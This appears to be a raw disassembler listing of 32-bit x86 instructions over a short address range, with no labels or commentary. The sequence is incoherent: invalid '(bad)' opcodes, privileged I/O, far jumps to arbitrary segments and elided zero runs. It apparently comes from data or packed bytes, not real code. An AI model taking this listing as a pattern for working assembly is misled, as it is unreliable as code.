  422c87:	mov    ch,0xe9
  422c89:	xchg   ebx,eax
  422c8a:	pushf  
  422c8b:	sar    edi,1
  422c8d:	inc    eax
  422c8e:	sar    DWORD PTR [edi-0x70906260],0x49
  422c95:	sbb    al,0xf7
  422c97:	enter  0xfce5,0x96
  422c9b:	out    dx,eax
  422c9c:	int3   
  422c9d:	sbb    eax,0x2e4cbd3
  422ca2:	push   ss
  422ca3:	pop    ss
  422ca4:	push   esp
  422ca5:	ret    0xc070
  422ca8:	mov    al,BYTE PTR [esi+0x44]
  422cab:	outs   dx,BYTE PTR ds:[esi]
  422cac:	pop    eax
  422cad:	lock push ecx
  422caf:	shl    BYTE PTR es:[edi-0x60b6f8ef],1
  422cb6:	pop    edi
  422cb7:	xchg   ebx,eax
  422cb8:	test   BYTE PTR [edx+0x5117687d],dl
  422cbe:	mov    ds:0xcad4888c,al
  422cc3:	xchg   esp,eax
  422cc4:	xor    bl,BYTE PTR [ebx-0x40]
  422cc7:	gs ds and bl,bh
  422ccb:	fcomp  DWORD PTR [esi+0x1695cafa]
  422cd1:	sbb    eax,0xcc453a8a
  422cd6:	scas   al,BYTE PTR es:[edi]
  422cd7:	adc    esp,eax
  422cd9:	scas   eax,DWORD PTR es:[edi]
  422cda:	inc    edi
  422cdb:	adc    ch,dh
  422cdd:	out    0x3b,al
  422cdf:	and    BYTE PTR [eax+0x72e4e9ab],0x3f
  422ce6:	addr16 ror ch,0x78
  422cea:	(bad)  
  422cec:	jl     0x422d33
  422cee:	xchg   esi,eax
  422cef:	lods   al,BYTE PTR ds:[esi]
  422cf0:	cmp    dh,BYTE PTR [esi]
  422cf2:	cmp    BYTE PTR [ecx+eax*4-0x61a7c087],al
  422cf9:	syscall 
  422cfb:	out    dx,al
  422cfc:	cli    
  422cfd:	call   DWORD PTR [eax]
  422cff:	mov    cl,0xb7
  422d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d02:	sbb    ebp,ecx
  422d04:	xor    edi,DWORD PTR [ecx+0x2f]
  422d07:	push   cs
  422d08:	lods   al,BYTE PTR ds:[esi]
  422d09:	leave  
  422d0a:	stos   DWORD PTR es:[edi],eax
  422d0b:	inc    ebp
  422d0c:	ss popf 
  422d0e:	in     al,0xfe
  422d10:	into   
  422d11:	imul   esp,DWORD PTR [ecx+0x71c1b42a],0x2b
  422d18:	cld    
  422d19:	dec    ecx
  422d1a:	and    ecx,0x8f8c12e5
  422d20:	sahf   
  422d21:	mov    dh,BYTE PTR [eax]
  422d23:	push   esi
  422d24:	sbb    eax,0x1985d9f6
  422d29:	mov    esi,0xe4b02058
  422d2e:	sub    ebp,0x52
  422d31:	retf   
  422d32:	and    eax,0xfc76aa24
  422d37:	sub    dh,bh
  422d39:	push   cs
  422d3a:	sub    ch,ch
  422d3c:	push   ebp
  422d3d:	mov    eax,0x57feef60
  422d42:	dec    esp
  422d43:	mov    ebp,0xebf56325
  422d48:	and    bl,BYTE PTR [edx]
  422d4a:	pop    ecx
  422d4b:	stos   BYTE PTR es:[edi],al
  422d4c:	mov    ch,0x1b
  422d4e:	imul   ecx,esi,0x22
  422d51:	or     BYTE PTR [esi-0x23bf0607],ch
  422d57:	mov    ecx,0x5b7887b0
  422d5c:	and    DWORD PTR [esi+0x3],0xffffffdc
  422d60:	xchg   ebx,eax
  422d61:	mov    bh,0x9
  422d63:	mov    dh,BYTE PTR [esi-0x641c3179]
  422d69:	into   
  422d6a:	and    al,0x61
  422d6c:	mov    dh,BYTE PTR [eax+eax*1+0x0]
	...
  422dd3:	add    BYTE PTR [eax],al
  422dd5:	add    BYTE PTR [edi+0x626d60bd],bh
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    edx,DWORD PTR [ecx+ebx*8]
  422de4:	test   al,0x54
  422de6:	addr16 jbe 0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    BYTE PTR [edi-0x119e6df2],ch
  422df3:	jmp    0x1c715b3a
  422df8:	or     eax,0xe3db2d64
  422dfd:	adc    BYTE PTR [ebp+0x69],0xc5
  422e01:	push   ebx
  422e02:	mov    al,0x43
  422e04:	dec    esp
  422e05:	pushf  
  422e06:	mov    al,ds:0x87b0820c
  422e0b:	mov    fs,WORD PTR [edi+0x2c406cdb]
  422e11:	push   es
  422e12:	sub    di,WORD PTR [edx]
  422e15:	dec    esi
  422e16:	and    eax,0xbfd5790a
  422e1b:	iret   
  422e1c:	jne    0x422e79
  422e1e:	sub    eax,0xdfe936b7
  422e23:	out    0xda,eax
  422e25:	sub    edx,esi
  422e27:	dec    ebp
  422e28:	stos   BYTE PTR es:[edi],al
  422e29:	xchg   edx,eax
  422e2a:	sbb    DWORD PTR [eax-0xaf05c9f],edx
  422e30:	fcomp  st(0)
  422e32:	mov    eax,ds:0xd9478375
  422e37:	pop    edi
  422e38:	cmp    DWORD PTR [edi-0x45],esp
  422e3b:	jbe    0x422e57
  422e3d:	push   esp
  422e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e40:	and    ax,0xb3f1
  422e44:	xchg   edx,eax
  422e45:	ss dec ebx
  422e47:	pop    esi
  422e48:	push   esp
  422e49:	pop    esp
  422e4a:	mov    ds:0x131e6924,eax
  422e4f:	push   esi
  422e50:	sar    BYTE PTR [eax+0x51],0x7c
  422e54:	cmp    esi,ebp
  422e56:	jo     0x422e75
  422e58:	fwait
  422e59:	leave  
  422e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e5b:	cmp    al,0x1e
  422e5d:	push   edi
  422e5e:	pop    ebp
  422e5f:	jns    0x422e9c
  422e61:	loopne 0x422dfb
  422e63:	add    dh,BYTE PTR [eax+0x43938cc4]
  422e69:	xchg   edx,eax
  422e6a:	imul   edx,DWORD PTR [esi],0x7a
  422e6d:	les    ebx,FWORD PTR [edx+0x71]
  422e70:	xchg   DWORD PTR [eax+0x11],ebp
  422e73:	pusha  
  422e74:	test   eax,0xe6d63b88
  422e79:	or     al,0x73
  422e7b:	xchg   edx,eax
  422e7c:	inc    edx
  422e7d:	or     DWORD PTR [edx-0x34],ebx
  422e80:	retf   0x3853
  422e83:	cmp    DWORD PTR [edi],eax
  422e85:	rcl    BYTE PTR [ecx],0xee
  422e88:	ins    DWORD PTR es:[edi],dx
  422e89:	sbb    al,0x15
  422e8b:	hlt    
  422e8c:	mov    ch,0xe
  422e8e:	aad    0xf5
  422e90:	dec    ebp
  422e91:	sub    ah,BYTE PTR [esi]
  422e93:	cmp    eax,0x73f31458
  422e98:	mov    dh,0x8b
  422e9a:	sbb    BYTE PTR [eax-0x346dd99c],cl
  422ea0:	jns    0x422ef4
  422ea2:	sub    BYTE PTR [edx],0x1
  422ea5:	jmp    0xc3c3:0x16c6fa76
  422eac:	sub    DWORD PTR [ebx+0x23],esi
  422eaf:	pop    ebp
  422eb0:	sbb    BYTE PTR [edi-0x3a],cl
  422eb3:	mov    ebp,DWORD PTR [esi+0x530c586e]
  422eb9:	imul   ebx,DWORD PTR [edi],0xffffffeb
  422ebc:	and    al,0x2a
  422ebe:	jmp    0x422ec3
  422ec0:	lds    esp,FWORD PTR [edi]
  422ec2:	or     BYTE PTR [edi],0x90
  422ec5:	dec    esi
  422ec6:	aaa    
  422ec7:	jp     0x422e79
  422ec9:	dec    eax
  422eca:	and    eax,esp
  422ecc:	sti    
  422ecd:	scas   eax,DWORD PTR es:[edi]
  422ece:	mov    eax,0xcf01a09a
  422ed3:	out    0x23,eax
  422ed5:	into   
  422ed6:	ret    0xd5cd
  422ed9:	push   DWORD PTR [eax-0x43]
  422edc:	adc    DWORD PTR [esi],0x19
  422edf:	jnp    0x422ebb
  422ee1:	mov    edx,0xfb35d1f9
  422ee6:	add    eax,0xacac0506
  422eeb:	pop    esp
  422eec:	mov    ebx,0x58
	...
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0x6cae
  422f64:	lods   al,BYTE PTR ds:[esi]
  422f65:	and    ah,BYTE PTR [edi+0x77]
  422f68:	add    DWORD PTR [eax],eax
  422f6a:	add    BYTE PTR [ecx],al
  422f6c:	add    BYTE PTR [eax],al
  422f6e:	inc    ecx
  422f6f:	and    DWORD PTR [ebx-0x6],0x161a18b3
  422f76:	not    ebx
  422f78:	sub    esi,DWORD PTR [edx]
  422f7a:	jae    0x422f87
  422f7c:	stos   DWORD PTR es:[edi],eax
  422f7d:	enter  0xa593,0x36
  422f81:	pop    ss
  422f82:	or     dl,0x17
  422f85:	retf   
  422f86:	nop
  422f87:	mov    esi,0xa6d6a105
  422f8c:	loopne 0x422fe3
  422f8e:	push   esp
  422f8f:	pop    edi
  422f90:	xchg   esp,eax
  422f91:	cmp    DWORD PTR [eax+edx*8-0x17],ecx
  422f95:	push   dx
  422f97:	jnp    0x422f70
  422f99:	mov    ah,0xcf
  422f9b:	pop    edx
  422f9c:	scas   eax,DWORD PTR es:[edi]
  422f9d:	mov    eax,esi
  422f9f:	cmp    DWORD PTR [edi],ecx
  422fa1:	lods   eax,DWORD PTR ds:[esi]
  422fa2:	and    al,0x95
  422fa4:	inc    ecx
  422fa5:	push   ss
  422fa6:	mov    bl,0xb5
  422fa8:	fcomp  st(7)
  422faa:	pop    ss
  422fab:	inc    esi
  422fac:	lods   eax,DWORD PTR ds:[esi]
  422fad:	dec    esi
  422fae:	xchg   ebp,eax
  422faf:	int    0x9d
  422fb1:	mov    dh,BYTE PTR ds:0x72e5dc9c
  422fb7:	adc    ah,0x2a
  422fba:	sub    cl,cl
  422fbc:	push   esi
  422fbd:	push   edx
  422fbe:	(bad)  
  422fbf:	xlat   BYTE PTR ds:[ebx]
  422fc0:	inc    esi
  422fc1:	add    al,0xea
  422fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fc4:	stos   DWORD PTR es:[edi],eax
  422fc5:	out    0xd,eax
  422fc7:	test   dh,0x3e
  422fca:	out    0x49,al
  422fcc:	jmp    0x512c:0x59b7210a
  422fd3:	mov    ds:0xfa8cd5b0,al
  422fd8:	out    dx,eax
  422fd9:	xor    cl,BYTE PTR [ecx-0x6437f3e1]
  422fdf:	pop    esp
  422fe0:	adc    ah,BYTE PTR ds:0x6cadce3c
  422fe6:	jmp    0x422ff5
  422fe8:	ja     0x422f7b
  422fea:	push   0x5dfd32ea
  422fef:	xchg   esi,eax
  422ff0:	and    al,0xe2
  422ff2:	adc    BYTE PTR [edx],ah
  422ff4:	loop   0x42302c
  422ff6:	jge    0x422fcc
  422ff8:	and    ah,bl
  422ffa:	adc    eax,DWORD PTR [ecx-0x43]
  422ffd:	mov    edx,0x4dce9b08
  423002:	jo     0x423020
  423004:	ins    DWORD PTR es:[edi],dx
  423005:	hlt    
  423006:	sub    DWORD PTR [ebp-0x711cb18d],esi
  42300c:	mov    esi,0xd68e6838
  423011:	(bad)  
  423013:	(bad)  
  423015:	add    bl,BYTE PTR [edx+eax*8+0x75]
  423019:	cs dec ebx
  42301b:	arpl   WORD PTR [ebx],cx
  42301d:	push   eax
  42301e:	mov    ch,0xac
  423020:	icebp  
  423021:	or     BYTE PTR [ecx],al
  423023:	stc    
  423024:	cmp    DWORD PTR [edx+0x39c25b33],eax
  42302a:	retf   0x931f
  42302d:	call   0xf3a60ef
  423032:	jmp    0x42304b
  423034:	loope  0x4230b5
  423036:	ins    BYTE PTR es:[edi],dx
  423037:	sub    al,0xda
  423039:	(bad)  
  42303a:	mov    es,WORD PTR [esi+0x1b3773c3]
  423040:	js     0x42306c
  423042:	pop    eax
  423043:	mov    cl,0x7
  423045:	push   es
  423046:	mul    BYTE PTR [ebp-0x3a]
  423049:	sub    dh,BYTE PTR [ebp-0xd]
  42304c:	hlt    
  42304d:	inc    edi
  42304e:	rcr    BYTE PTR [edx-0x3e],cl
  423051:	jno    0x423053
  423053:	mov    cl,0x8f
  423055:	out    0xb0,al
  423057:	mov    eax,ds:0x315fa620
  42305c:	ss ja  0x4230b5
  42305f:	sub    BYTE PTR [eax-0x61fe8642],al
  423065:	mov    edx,0x1e24a210
  42306a:	inc    ebp
  42306b:	jl     0x423004
  42306d:	mov    BYTE PTR [eax],al
	...
  4230d3:	add    BYTE PTR [eax],al
  4230d5:	add    BYTE PTR [esi-0x1c],al
  4230d8:	bound  ecx,QWORD PTR [eax-0x1111711e]
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edx+eax*1+0x67749438],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [ecx],bl
  4230ef:	sbb    BYTE PTR [eax+0x61a53b9e],ch
  4230f5:	lahf   
  4230f6:	loope  0x4230c6
  4230f8:	dec    ebx
  4230f9:	imul   eax,DWORD PTR [ebx-0x21],0xffffffcd
  4230fd:	or     esi,DWORD PTR [edx-0x41]
  423100:	push   ecx
  423101:	cwde   
  423102:	mov    ecx,DWORD PTR [eax-0x1e7b793]
  423108:	mov    cl,0x8a
  42310a:	lods   al,BYTE PTR ds:[esi]
  42310b:	add    al,0xdc
  42310d:	sahf   
  42310e:	sahf   
  42310f:	xor    ecx,DWORD PTR [eax+0x42]
  423112:	xlat   BYTE PTR ds:[ebx]
  423113:	jbe    0x423169
  423115:	xchg   ebx,eax
  423116:	idiv   DWORD PTR [eax]
  423118:	pop    esi
  423119:	and    DWORD PTR [edx],edx
  42311b:	mov    DWORD PTR [ecx],esp
  42311d:	push   cs
  42311e:	cmp    eax,0x7a7193ac
  423123:	pop    esp
  423124:	cli    
  423125:	pop    ss
  423126:	xchg   edx,eax
  423127:	int3   
  423128:	and    esi,DWORD PTR [ecx+0x7e80e2b9]
  42312e:	(bad)  
  42312f:	push   ecx
  423130:	inc    eax
  423131:	fwait
  423132:	(bad)  
  423133:	jmp    0x42319e
  423135:	pop    esi
  423136:	sar    dh,cl
  423138:	pop    edx
  423139:	out    dx,al
  42313a:	stos   DWORD PTR es:[edi],eax
  42313b:	int    0x5e
  42313d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42313f:	mov    dl,0x83
  423141:	and    BYTE PTR [edi*4-0x69b8d2e],0x18
  423149:	mov    al,ds:0x3b34ecb
  42314e:	nop
  42314f:	sti    
  423150:	jl     0x42315c
  423152:	test   DWORD PTR [eax-0x47],ebp
  423155:	cwde   
  423156:	push   edx
  423157:	mov    ds:0xe8331756,al
  42315c:	stos   DWORD PTR es:[edi],eax
  42315d:	fild   QWORD PTR [esi-0x44ca6c05]
  423163:	gs test eax,0x17af950c
  423169:	add    esi,esi
  42316b:	out    dx,al
  42316c:	sbb    DWORD PTR [esi-0x38bda70a],eax
  423172:	aad    0x7c
  423174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423175:	inc    esi
  423176:	mov    bh,0x9
  423178:	sub    edi,DWORD PTR [ebx]
  42317a:	jno    0x423132
  42317c:	jnp    0x423176
  42317e:	or     BYTE PTR [ebx-0x40932ab0],dh
  423184:	retf   
  423185:	shl    DWORD PTR [eax+0x423bce97],cl
  42318b:	les    eax,FWORD PTR [ecx+0x1ad78ea3]
  423191:	adc    eax,esi
  423193:	pop    edx
  423194:	inc    esi
  423195:	mov    ch,ch
  423197:	addr16 mov ebp,?
  42319a:	xor    DWORD PTR [esi-0x41],ebp
  42319d:	imul   edi,DWORD PTR [ecx+0x3c],0x47
  4231a1:	sub    al,0x2a
  4231a3:	push   edi
  4231a4:	sub    bl,bl
  4231a6:	call   0xa1a2:0x8f61dfbb
  4231ad:	gs cs xchg ecx,eax
  4231b1:	outs   dx,BYTE PTR ds:[esi]
  4231b2:	and    eax,0x9fe69daa
  4231b7:	xchg   esp,eax
  4231b8:	xchg   edi,eax
  4231b9:	leave  
  4231ba:	es sbb ch,dl
  4231bd:	fs (bad) 
  4231bf:	in     al,dx
  4231c0:	fmul   QWORD PTR [edx]
  4231c2:	aaa    
  4231c3:	stos   DWORD PTR es:[edi],eax
  4231c4:	test   DWORD PTR [edi+0x38],edi
  4231c7:	inc    esp
  4231c8:	push   es
  4231c9:	mov    esp,es
  4231cb:	out    0xf7,al
  4231cd:	lahf   
  4231ce:	pop    eax
  4231cf:	jg     0x4231a9
  4231d1:	or     dl,BYTE PTR [esi+0x78]
  4231d4:	jne    0x4231ec
  4231d6:	sti    
  4231d7:	add    DWORD PTR [edi+eax*8-0x53],esi
  4231db:	pop    ds
  4231dc:	xor    BYTE PTR [ebp+0x38a50b47],dh
  4231e2:	ror    DWORD PTR [ecx-0x4d263ff0],1
  4231e8:	lods   eax,DWORD PTR ds:[esi]
  4231e9:	cdq    
  4231ea:	adc    al,0x28
  4231ec:	out    0x2e,eax
	...
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x191b796],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR [edx-0x1254ea8],dl
  423273:	je     0x42320c
  423275:	pop    edx
  423276:	add    ecx,edi
  423278:	das    
  423279:	inc    esp
  42327a:	pop    ds
  42327b:	push   esi
  42327c:	xchg   ebx,eax
  42327d:	out    dx,al
  42327e:	mov    edi,0xb64f9582
  423283:	inc    esp
  423284:	pop    esp
  423285:	jge    0x4232ca
  423287:	pop    es
  423288:	clc    
  423289:	push   ds
  42328a:	mov    eax,0x5d977c0e
  42328f:	push   edx
  423290:	lods   al,BYTE PTR ds:[esi]
  423291:	lods   eax,DWORD PTR ds:[esi]
  423292:	mov    dh,BYTE PTR [edi-0x45]
  423295:	lds    esi,FWORD PTR [eax-0x1a]
  423298:	cmp    al,cl
  42329a:	cmovb  ebp,eax
  42329d:	retf   0xfb54
  4232a0:	inc    edx
  4232a1:	(bad)  
  4232a2:	loop   0x423280
  4232a4:	aam    0x0
  4232a6:	add    eax,0xcad3a32b
  4232ab:	ins    BYTE PTR es:[edi],dx
  4232ac:	cmp    al,0x37
  4232ae:	mov    esi,DWORD PTR [esi]
  4232b0:	jmp    0xfa1c07c2
  4232b5:	jmp    0x7cc5:0x8d49f741
  4232bc:	test   DWORD PTR [ecx+0x78a4c528],esi
  4232c2:	and    edx,esi
  4232c4:	sbb    DWORD PTR [edi],ebx
  4232c6:	daa    
  4232c7:	aaa    
  4232c8:	aad    0x9a
  4232ca:	xchg   esp,eax
  4232cb:	dec    ebp
  4232cc:	inc    ebx
  4232cd:	and    DWORD PTR [ebp+0x4b8e0f70],ebp
  4232d3:	ja     0x423277
  4232d5:	sub    bl,bh
  4232d7:	shl    esi,cl
  4232d9:	test   BYTE PTR [edi],0x71
  4232dc:	push   esp
  4232dd:	or     dh,dl
  4232df:	ret    
  4232e0:	enter  0x50bd,0x5d
  4232e4:	mov    edx,0x380c2c32
  4232e9:	cs jecxz 0x42333a
  4232ec:	call   edx
  4232ee:	in     al,dx
  4232ef:	cdq    
  4232f0:	pop    ebx
  4232f1:	and    ebx,eax
  4232f3:	and    BYTE PTR [ebx+ebx*4+0x40410d13],bl
  4232fa:	stos   BYTE PTR es:[edi],al
  4232fb:	stos   BYTE PTR es:[edi],al
  4232fc:	push   esp
  4232fd:	or     BYTE PTR [eax+0x247e108c],dl
  423303:	xor    eax,0x1b370973
  423308:	xor    al,0x73
  42330a:	repz cli 
  42330c:	mov    bl,0x20
  42330e:	pop    eax
  42330f:	test   eax,0x4acca07d
  423314:	repz sub dh,ch
  423317:	mov    bl,BYTE PTR [eax+0x581bc52e]
  42331d:	jae    0x42331b
  42331f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423320:	pop    ecx
  423321:	adc    DWORD PTR [edi+0x1e],0xffffffaf
  423325:	or     eax,0x41b31af4
  42332a:	out    dx,eax
  42332b:	lods   eax,DWORD PTR ds:[esi]
  42332c:	jns    0x42338f
  42332e:	mov    edi,?
  423330:	jnp    0x423376
  423332:	jbe    0x4232da
  423334:	mov    eax,0xc1e6e4f6
  423339:	dec    esi
  42333a:	adc    al,0xa9
  42333c:	mov    dl,0x84
  42333e:	lods   al,BYTE PTR ds:[esi]
  42333f:	ret    
  423340:	out    dx,eax
  423341:	or     ecx,DWORD PTR [esi]
  423343:	pop    edi
  423344:	pop    esi
  423345:	aas    
  423346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423347:	sub    dh,ch
  423349:	push   ds
  42334a:	pop    eax
  42334b:	xor    DWORD PTR [ecx-0x75cbcbda],0xc7daf7f3
  423355:	jmp    0x423304
  423357:	out    0xc9,al
  423359:	jp     0x4232f4
  42335b:	in     al,0xed
  42335d:	aad    0x6a
  42335f:	ins    BYTE PTR es:[edi],dx
  423360:	sbb    DWORD PTR [edx-0x66],edx
  423363:	clc    
  423364:	xchg   esp,eax
  423365:	cmp    eax,0x2878cccd
  42336a:	fistp  QWORD PTR [edx]
  42336c:	pusha  
  42336d:	add    eax,DWORD PTR [eax]
	...
  4233d3:	add    BYTE PTR [eax],al
  4233d5:	add    al,bh
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xd8f50f44
  4233e4:	add    ch,BYTE PTR [edi+0x67]
  4233e7:	jp     0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    BYTE PTR [ebx-0x94e436],bl
  4233f3:	sahf   
  4233f4:	mov    edx,0xac18a5a
  4233f9:	adc    edx,DWORD PTR [ebp+ecx*1+0x61]
  4233fd:	push   0x4b
  4233ff:	and    eax,0x1a422db2
  423404:	iret   
  423405:	cdq    
  423406:	pop    edi
  423407:	mov    DWORD PTR [edi-0x4d257019],edx
  42340d:	pushf  
  42340e:	lods   al,BYTE PTR ds:[esi]
  42340f:	pop    es
  423410:	nop
  423411:	inc    ebx
  423412:	adc    BYTE PTR [edx-0x7055802c],0x3b
  423419:	repz and ebp,DWORD PTR [ebx]
  42341c:	idiv   BYTE PTR ds:0xa01fce7e
  423422:	and    cl,BYTE PTR es:[esi+0xdb1fe17]
  423429:	pop    ecx
  42342a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42342c:	into   
  42342d:	ret    0xa64d
  423430:	mov    edi,0x560a86aa
  423435:	bound  ebx,QWORD PTR [esi+ecx*8+0x55]
  423439:	mov    DWORD PTR [edx-0x67244527],esp
  42343f:	nop
  423440:	sbb    BYTE PTR ds:0x916b84d6,dh
  423446:	ret    
  423447:	(bad)  
  423448:	fs cmp edx,ebx
  42344b:	dec    ebp
  42344c:	fcom   QWORD PTR ss:[eax+0x27]
  423450:	lods   al,BYTE PTR ds:[esi]
  423451:	ret    
  423452:	jecxz  0x423483
  423454:	pushf  
  423455:	pop    edx
  423456:	push   ebp
  423457:	mov    edx,0x756cb52
  42345c:	sbb    edi,DWORD PTR [edi-0x38]
  42345f:	cmp    ebp,DWORD PTR [esi-0x7fb8b1e0]
  423465:	ins    BYTE PTR es:[edi],dx
  423466:	shl    BYTE PTR [edi+0x3f29e322],1
  42346c:	adc    ecx,DWORD PTR [ecx]
  42346e:	mov    ebp,0x4922d336
  423473:	loop   0x423477
  423475:	jle    0x4234b7
  423477:	int    0xbc
  423479:	push   ebp
  42347a:	pop    eax
  42347b:	and    BYTE PTR [ebp-0x10],bh
  42347e:	fld    DWORD PTR [esi]
  423480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423481:	mov    esi,0x3e653471
  423486:	add    edi,DWORD PTR [esp+ecx*1+0x44]
  42348a:	jp     0x423428
  42348c:	mov    ds,edi
  42348e:	dec    esi
  42348f:	push   ebx
  423490:	xchg   ecx,eax
  423491:	xlat   BYTE PTR ds:[ebx]
  423492:	jnp    0x42348e
  423494:	addr16 inc edi
  423496:	rcr    BYTE PTR [ecx+0x376a85d2],cl
  42349c:	mov    ebx,0xcb5f7397
  4234a1:	push   ecx
  4234a2:	cmp    BYTE PTR [edx-0x24],0x6e
  4234a6:	pop    ebp
  4234a7:	ss leave 
  4234a9:	retf   0x7d59
  4234ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234ad:	lods   eax,DWORD PTR ds:[esi]
  4234ae:	sbb    DWORD PTR [esi-0xc3829ea],0xffffffa7
  4234b5:	dec    esi
  4234b6:	pop    ecx
  4234b7:	and    BYTE PTR [ebx+0x16],al
  4234ba:	mov    dl,BYTE PTR [eax-0x71]
  4234bd:	cmp    BYTE PTR [eax],dl
  4234bf:	jne    0x4234b8
  4234c1:	inc    ebx
  4234c2:	or     ecx,DWORD PTR [edi+0x66]
  4234c5:	mov    bl,0xd0
  4234c7:	ror    DWORD PTR [esi+edi*2+0x1df2afe9],cl
  4234ce:	test   eax,0x69113cb
  4234d3:	xlat   BYTE PTR ds:[ebx]
  4234d4:	xor    al,0x16
  4234d6:	or     eax,DWORD PTR [ebx+eax*8]
  4234d9:	mov    bl,0x39
  4234db:	jmp    0x5755:0x282adfee
  4234e2:	or     al,0xd
  4234e4:	in     al,dx
  4234e5:	push   edi
  4234e6:	jmp    0x4234b6
  4234e8:	pusha  
  4234e9:	cld    
  4234ea:	(bad)  
  4234eb:	sub    BYTE PTR [ebx+edx*1+0x0],al
	...
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	rcl    BYTE PTR [ebp+0x7b67d59d],cl
  423568:	add    DWORD PTR [eax],eax
  42356a:	add    BYTE PTR [ecx],al
  42356c:	add    BYTE PTR [eax],al
  42356e:	sub    dl,dl
  423570:	push   edi
  423571:	enter  0x81f6,0x69
  423575:	adc    dh,bl
  423577:	stos   BYTE PTR es:[edi],al
  423578:	mov    cl,0xda
  42357a:	adc    al,0xa3
  42357c:	ja     0x4235d7
  42357e:	mov    esi,0x13560e37
  423583:	aad    0xf4
  423585:	push   ds
  423586:	inc    edx
  423587:	mov    dl,0x15
  423589:	pop    es
  42358a:	pushf  
  42358b:	dec    edx
  42358c:	xchg   dh,al
  42358e:	stc    
  42358f:	pop    esp
  423590:	ja     0x423583
  423592:	lods   eax,DWORD PTR ds:[esi]
  423593:	in     eax,dx
  423594:	xchg   ah,dl
  423596:	in     al,0xf
  423598:	inc    eax
  423599:	xor    dh,BYTE PTR [esi-0x75]
  42359c:	and    esp,DWORD PTR [edx-0x24]
  42359f:	jl     0x42353e
  4235a1:	pop    edx
  4235a2:	mov    dh,0x14
  4235a4:	jae    0x423570
  4235a6:	shl    edi,0x5c
  4235a9:	into   
  4235aa:	sbb    al,0x4
  4235ac:	fwait
  4235ad:	xchg   esp,eax
  4235ae:	aas    
  4235af:	mov    ebp,0x842ef261
  4235b4:	jp     0x4235b0
  4235b6:	adc    edi,ebx
  4235b8:	jns    0x42358d
  4235ba:	push   cs
  4235bb:	jge    0x423613
  4235bd:	in     eax,0xba
  4235bf:	mov    eax,DWORD PTR [esi-0x1a]
  4235c2:	pop    ebx
  4235c3:	xchg   DWORD PTR [eax],ecx
  4235c5:	je     0x423646
  4235c7:	shl    DWORD PTR [eax-0xe071a0f],cl
  4235cd:	sti    
  4235ce:	add    al,0x6e
  4235d0:	fninit 
  4235d2:	mov    eax,ds:0x39926645
  4235d7:	pop    ebp
  4235d8:	adc    eax,0x66dc196
  4235dd:	add    eax,0x52ac819d
  4235e2:	stos   DWORD PTR es:[edi],eax
  4235e3:	dec    ebp
  4235e4:	jle    0x4235ca
  4235e6:	mov    ebx,0xad56dac1
  4235eb:	mov    DWORD PTR [esi+0x34f150b7],0xc895f6d0
  4235f5:	arpl   WORD PTR [ebp-0x52],di
  4235f8:	cmp    ah,dh
  4235fa:	jns    0x423635
  4235fc:	jge    0x423642
  4235fe:	jmp    0x3f63:0xdc08caa1
  423605:	pop    eax
  423606:	jbe    0x423677
  423608:	jb     0x4235f1
  42360a:	ds pop ds
  42360c:	push   eax
  42360d:	cmp    al,BYTE PTR [ebx+eiz*4+0x279c3590]
  423614:	mov    eax,ds:0xd444f534
  423619:	out    dx,al
  42361a:	sbb    DWORD PTR [edx+0x4e8a58d0],0x33
  423621:	lock mov bh,0xd4
  423624:	test   al,0x17
  423626:	fmul   QWORD PTR [ecx]
  423628:	repz sbb al,0xf1
  42362b:	es call 0x640971a7
  423631:	(bad)
  423634:	mov    eax,ds:0x1e2a76e
  423639:	(bad)  
  42363a:	push   ecx
  42363b:	aad    0x16
  42363d:	cld    
  42363e:	fadd   QWORD PTR [edi]
  423640:	mov    eax,0xa0cc4ca4
  423645:	(bad)  
  423646:	add    DWORD PTR [esi+0x29a8ce39],0x5c337ab1
  423650:	inc    edx
  423651:	mov    cl,0xdf
  423653:	xor    BYTE PTR [edx],al
  423655:	cmp    eax,0x9b69874c
  42365a:	sub    al,0x33
  42365c:	inc    edx
  42365d:	bound  edx,QWORD PTR [ebp+0x30]
  423660:	adc    dl,BYTE PTR [ebp-0xc214ae3]
  423666:	pop    ss
  423667:	push   ds
  423668:	ss inc esi
  42366a:	jmp    0xf518cd
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x106d2913
  4236e5:	mov    ecx,0x17c67
  4236ea:	add    BYTE PTR [ecx],al
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	ficomp DWORD PTR [edi+0x63]
  4236f1:	xor    ecx,DWORD PTR [edi]
  4236f3:	aad    0x29
  4236f5:	jle    0x4236b5
  4236f7:	(bad)  
  4236f8:	push   0x7f
  4236fa:	jno    0x423776
  4236fc:	repz xlat BYTE PTR ds:[ebx]
